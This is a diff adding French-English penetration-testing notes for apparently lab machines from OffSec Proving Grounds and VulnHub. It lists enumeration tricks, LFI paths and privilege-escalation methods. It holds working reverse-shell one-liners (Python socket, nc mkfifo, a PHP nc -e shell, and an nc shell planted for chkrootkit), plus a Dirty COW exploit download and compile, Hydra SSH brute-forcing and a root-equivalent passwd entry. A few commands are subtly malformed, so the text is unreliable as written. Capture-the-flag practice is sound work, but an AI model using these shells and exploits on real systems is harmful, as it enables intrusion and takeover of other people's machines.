@@ -48,3 +48,92 @@ pip3 install cryptography
 
 Linux Ubuntu 3.2.0-23- -> https://systemweakness.com/offsec-proving-ground-sumo-9c73436f71f4 c0w
 export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH
+
+
+
+
+
+Sar, FunboxRookie, Gaara, OnSystemShellDredd, FunboxEasyEnum, SunsetDecoy, Solstice, Katana, InfosecPrep, Inclusiveness, Potato, Seppuku, Lampiao, FunboxEasy, Wpwn, EvilBox-One
+
+#Enumeration
+	- robots.txt with user-agent.
+	- Ftp anonymous
+	- WebEnumeration: username
+	- Upload Page
+	- LFI
+		○ ../../../etc/passwd
+		○ /var/log/apache2/access.log&cmd=id
+	- Secret.txt with id_rsa
+	- .php Strcmp username[]=""&password[]=""
+	- Smbclient
+	- Page protégé par mot de passe -> voir cookie
+	- Wordpress
+	- Evil page, use LFI
+	- XXX
+
+#Getting
+	- Exploit-db : 47204
+	- John
+	- Id_rsa
+	- SSH Bruteforce
+	- Shell Upload
+	- /etc/passwd hash brutforce
+	- Ssh username@IP -t "bash --noprofile"
+	- Ftp /etc/vsftpd.conf
+	- $PATH modifié pour un script 
+	- Drupal: drupalgeddon
+	- Wordpress -> WSScan, RFI with file on kali host
+	- XXX
+
+
+#Privilège Excalation
+	- Cron jobs: /etc/crontab
+	- .mysql_history
+	- sudo -l
+		○ GNU Debugger (GBD)
+		○ Cpulimit
+		○ Cap_net_raw+ep
+			§ /usr/bin/python2.7 -c 'importer os ; os.setuid(0); os.system("/bin/bash")'
+		○ /bin/bash -p
+		○ /bin/nice /notes/../bin/bash
+	- /etc/phpyadmin/config-db.php
+	- Pspy + script
+		○ Chkrootkit  -> echo "/usr/bin/nc 192.168.1.27 4444 -e /bin/sh" > update
+	- Index.php en droit root
+	- wget https://www.exploit-db.com/download/40847.cpp 
+		○ ++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+	
+	- 
+			
+			
+	
+
+#Login/mdp
+
+
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.65",1010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+python3 -c 'import os; os.system("/bin/bash");'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2 > &1 |nc 192.168.49.152 9001 >/tmp/f
+<?php system('nc 192.168.49.220 4445 -e /bin/bash')?>
+
+
+Hydra -l username -P file.list -t 8.8.8.8 ssh
+
+SUID bit binaries through which I can become root : find / -perm -u=s -type f 2>/dev/null
+
+ssh -p 61000 -i id_rsa hannah@192.168.172.130
+
+Sar: https://medium.com/infosec-adventures/sar-walkthrough-2de4f08c03b6
+FunboxRookie: https://www.hacknos.com/funbox-rookie-vulnhub-walkthrough/
+
+Ressource:
+	- Cron Time: https://crontab.guru/
+
+
+Password hash of infosec: $1$aMyu0OrN$xq9uJWWly7Nfy43bofl6U1
+infosec:$1$aMyu0OrN$xq9uJWWly7Nfy43bofl6U1:0:0:root:/root:/bin/bash
+
+
+Netdiscover
